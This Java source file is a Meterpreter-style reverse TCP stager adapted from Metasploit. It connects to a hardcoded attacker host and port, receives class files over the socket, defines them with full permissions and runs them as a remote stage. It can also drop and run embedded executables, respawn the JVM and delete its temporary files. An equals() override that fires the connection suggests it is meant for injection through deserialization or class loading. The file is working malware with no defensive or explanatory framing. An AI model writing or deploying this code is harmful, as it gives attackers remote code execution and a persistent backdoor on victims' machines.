import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.io.PrintStream;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;
import java.net.URLConnection;
import java.security.AllPermission;
import java.security.CodeSource;
import java.security.Permissions;
import java.security.ProtectionDomain;
import java.security.cert.Certificate;
import java.util.Locale;
import java.util.Properties;
import java.util.Stack;
import java.util.StringTokenizer;


public class MeterReverseTCP extends ClassLoader {
    public static String ip;
    public static String port;
    private static final String OS_NAME;
    private static final String PATH_SEP;
    private static final boolean IS_AIX;
    private static final boolean IS_DOS;
    private static final String JAVA_HOME;

    static {
        OS_NAME = System.getProperty("os.name").toLowerCase(Locale.ENGLISH);
        PATH_SEP = System.getProperty("path.separator");
        IS_AIX = "aix".equals(OS_NAME);
        IS_DOS = PATH_SEP.equals(";");
        JAVA_HOME = System.getProperty("java.home");
    }

    @Override
    public boolean equals(Object obj) {
        ip="targetIP";
        port="targetPORT";
        try {
            RunMeterReverseConnect();
            return true;
        } catch (Exception e) {
            return false;
        }
    }


    public static void main(String[] args) {
        ip = "192.168.88.129";
        port = "9999";
        try {
            MeterReverseTCP meterReverseTCP = new MeterReverseTCP();
            meterReverseTCP.RunMeterReverseConnect();
        } catch (Exception e) {
            e.printStackTrace();
        }

    }

    private void RunMeterReverseConnect() throws Exception {
        Properties props = new Properties();
        Class clazz = MeterReverseTCP.class;
        String clazzFile = clazz.getName().replace('.', '/') + ".class";
        props.put("LHOST", ip);
        props.put("LPORT", port);
        String executableName = props.getProperty("Executable");
        File droppedFile;
        if (executableName != null) {
            File dummyTempFile = File.createTempFile("~spawn", ".tmp");
            dummyTempFile.delete();
            File tempDir = new File(dummyTempFile.getAbsolutePath() + ".dir");
            tempDir.mkdir();
            droppedFile = new File(tempDir, executableName);
            writeEmbeddedFile(clazz, executableName, droppedFile);
            props.remove("Executable");
            props.put("DroppedExecutable", droppedFile.getCanonicalPath());
        }

        int spawn = Integer.parseInt(props.getProperty("Spawn", "0"));
        String droppedExecutable = props.getProperty("DroppedExecutable");
        int i;
        if (spawn > 0) {
            props.setProperty("Spawn", String.valueOf(spawn - 1));
            droppedFile = File.createTempFile("~spawn", ".tmp");
            droppedFile.delete();
            File tempDir = new File(droppedFile.getAbsolutePath() + ".dir");
            File propFile = new File(tempDir, "metasploit.dat");
            File classFile = new File(tempDir, clazzFile);
            classFile.getParentFile().mkdirs();
            writeEmbeddedFile(clazz, clazzFile, classFile);
            if (props.getProperty("URL", "").startsWith("https:")) {
                writeEmbeddedFile(clazz, "metasploit/PayloadTrustManager.class", new File(classFile.getParentFile(), "PayloadTrustManager.class"));
            }

            if (props.getProperty("AESPassword", (String) null) != null) {
                writeEmbeddedFile(clazz, "metasploit/AESEncryption.class", new File(classFile.getParentFile(), "AESEncryption.class"));
            }

            FileOutputStream fos = new FileOutputStream(propFile);
            props.store(fos, "");
            fos.close();
            Process proc = Runtime.getRuntime().exec(new String[]{getJreExecutable("java"), "-classpath", tempDir.getAbsolutePath(), clazz.getName()});
            proc.getInputStream().close();
            proc.getErrorStream().close();
            Thread.sleep(2000L);
            File[] files = new File[]{classFile, classFile.getParentFile(), propFile, tempDir};

            for (int j = 0; j < files.length; ++j) {
                for (i = 0; i < 10 && !files[j].delete(); ++i) {
                    files[j].deleteOnExit();
                    Thread.sleep(100L);
                }
            }
        } else if (droppedExecutable != null) {
            droppedFile = new File(droppedExecutable);
            if (!IS_DOS) {
                try {
                    try {
                        File.class.getMethod("setExecutable", Boolean.TYPE).invoke(droppedFile, Boolean.TRUE);
                    } catch (NoSuchMethodException var16) {
                        Runtime.getRuntime().exec(new String[]{"chmod", "+x", droppedExecutable}).waitFor();
                    }
                } catch (Exception var17) {
                    var17.printStackTrace();
                }
            }

            Runtime.getRuntime().exec(new String[]{droppedExecutable});
            if (!IS_DOS) {
                droppedFile.delete();
                droppedFile.getParentFile().delete();
            }
        } else {
            int lPort = Integer.parseInt(props.getProperty("LPORT", "4444"));
            String lHost = props.getProperty("LHOST", (String) null);
            String url = props.getProperty("URL", (String) null);
            Object in;
            Object out;
            if (lPort <= 0) {
                in = System.in;
                out = System.out;
            } else if (url != null) {
                if (url.startsWith("raw:")) {
                    in = new ByteArrayInputStream(url.substring(4).getBytes("ISO-8859-1"));
                } else if (url.startsWith("https:")) {
                    URLConnection uc = (new URL(url)).openConnection();
                    Class.forName("metasploit.PayloadTrustManager").getMethod("useFor", URLConnection.class).invoke((Object) null, uc);
                    in = uc.getInputStream();
                } else {
                    in = (new URL(url)).openStream();
                }

                out = new ByteArrayOutputStream();
            } else {
                Socket socket;
                if (lHost != null) {
                    socket = new Socket(lHost, lPort);
                } else {
                    ServerSocket serverSocket = new ServerSocket(lPort);
                    socket = serverSocket.accept();
                    serverSocket.close();
                }

                in = socket.getInputStream();
                out = socket.getOutputStream();
            }

            String aesPassword = props.getProperty("AESPassword", (String) null);
            if (aesPassword != null) {
                Object[] streams = (Object[]) Class.forName("metasploit.AESEncryption").getMethod("wrapStreams", InputStream.class, OutputStream.class, String.class).invoke((Object) null, in, out, aesPassword);
                in = (InputStream) streams[0];
                out = (OutputStream) streams[1];
            }

            StringTokenizer stageParamTokenizer = new StringTokenizer("Payload -- " + props.getProperty("StageParameters", ""), " ");
            String[] stageParams = new String[stageParamTokenizer.countTokens()];

            for (i = 0; i < stageParams.length; ++i) {
                stageParams[i] = stageParamTokenizer.nextToken();
            }

            (new MeterReverseTCP()).bootstrap((InputStream) in, (OutputStream) out, props.getProperty("EmbeddedStage", (String) null), stageParams);
        }

    }

    private static void writeEmbeddedFile(Class clazz, String resourceName, File targetFile) throws FileNotFoundException, IOException {
        InputStream in = clazz.getResourceAsStream("/" + resourceName);
        FileOutputStream fos = new FileOutputStream(targetFile);
        byte[] buf = new byte[4096];

        int len;
        while ((len = in.read(buf)) != -1) {
            fos.write(buf, 0, len);
        }

        fos.close();
    }

    private final void bootstrap(InputStream rawIn, OutputStream out, String embeddedStageName, String[] stageParameters) throws Exception {
        try {
            DataInputStream in = new DataInputStream(rawIn);
            Permissions permissions = new Permissions();
            permissions.add(new AllPermission());
            ProtectionDomain pd = new ProtectionDomain(new CodeSource(new URL("file:///"), new Certificate[0]), permissions);
            Class clazz;
            if (embeddedStageName == null) {
                int length = in.readInt();

                do {
                    byte[] classfile = new byte[length];
                    in.readFully(classfile);
                    this.resolveClass(clazz = this.defineClass((String) null, classfile, 0, length, pd));
                    length = in.readInt();
                } while (length > 0);
            } else {
                clazz = Class.forName("javapayload.stage." + embeddedStageName);
            }

            Object stage = clazz.newInstance();
            clazz.getMethod("start", DataInputStream.class, OutputStream.class, String[].class).invoke(stage, in, out, stageParameters);
        } catch (Throwable var11) {
            var11.printStackTrace();
            var11.printStackTrace(new PrintStream(out));
        }

    }

    private static String getJreExecutable(String command) {
        File jExecutable = null;
        if (IS_AIX) {
            jExecutable = findInDir(JAVA_HOME + "/sh", command);
        }

        if (jExecutable == null) {
            jExecutable = findInDir(JAVA_HOME + "/bin", command);
        }

        return jExecutable != null ? jExecutable.getAbsolutePath() : addExtension(command);
    }

    private static String addExtension(String command) {
        return command + (IS_DOS ? ".exe" : "");
    }

    private static File findInDir(String dirName, String commandName) {
        File dir = normalize(dirName);
        File executable = null;
        if (dir.exists()) {
            executable = new File(dir, addExtension(commandName));
            if (!executable.exists()) {
                executable = null;
            }
        }

        return executable;
    }

    private static File normalize(String path) {
        Stack s = new Stack();
        String[] dissect = dissect(path);
        s.push(dissect[0]);
        StringTokenizer tok = new StringTokenizer(dissect[1], File.separator);

        while (tok.hasMoreTokens()) {
            String thisToken = tok.nextToken();
            if (!".".equals(thisToken)) {
                if ("..".equals(thisToken)) {
                    if (s.size() < 2) {
                        return new File(path);
                    }

                    s.pop();
                } else {
                    s.push(thisToken);
                }
            }
        }

        StringBuffer sb = new StringBuffer();

        for (int i = 0; i < s.size(); ++i) {
            if (i > 1) {
                sb.append(File.separatorChar);
            }

            sb.append(s.elementAt(i));
        }

        return new File(sb.toString());
    }

    private static String[] dissect(String path) {
        char sep = File.separatorChar;
        path = path.replace('/', sep).replace('\\', sep);
        String root = null;
        int colon = path.indexOf(58);
        int nextsep;
        if (colon > 0 && IS_DOS) {
            nextsep = colon + 1;
            root = path.substring(0, nextsep);
            char[] ca = path.toCharArray();
            root = root + sep;
            nextsep = ca[nextsep] == sep ? nextsep + 1 : nextsep;
            StringBuffer sbPath = new StringBuffer();

            for (int i = nextsep; i < ca.length; ++i) {
                if (ca[i] != sep || ca[i - 1] != sep) {
                    sbPath.append(ca[i]);
                }
            }

            path = sbPath.toString();
        } else if (path.length() > 1 && path.charAt(1) == sep) {
            nextsep = path.indexOf(sep, 2);
            nextsep = path.indexOf(sep, nextsep + 1);
            root = nextsep > 2 ? path.substring(0, nextsep + 1) : path;
            path = path.substring(root.length());
        } else {
            root = File.separator;
            path = path.substring(1);
        }

        return new String[]{root, path};
    }

}
